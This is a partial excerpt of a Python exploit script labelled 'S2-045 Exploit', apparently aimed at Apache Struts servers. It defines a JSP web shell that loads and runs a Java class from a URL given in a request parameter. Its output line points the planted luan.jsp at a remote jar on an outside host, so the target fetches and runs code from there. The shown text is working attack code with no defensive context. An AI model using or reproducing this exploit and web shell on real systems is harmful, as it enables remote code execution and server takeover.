...
jspCode = '''<%=Class.forName("Load",true,new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(request.getParameter("u"))})).getMethods()[0].invoke(null, new Object[]{request.getParameterMap()})%>'''

print "S2-045 Exploit / by S7star"
...
if result == "fail":
    ...
    print result,"http://"+url.split('/')[2]+"/luan.jsp?u=http://www.blogsir.com.cn/lj_ctf/Cat.jar"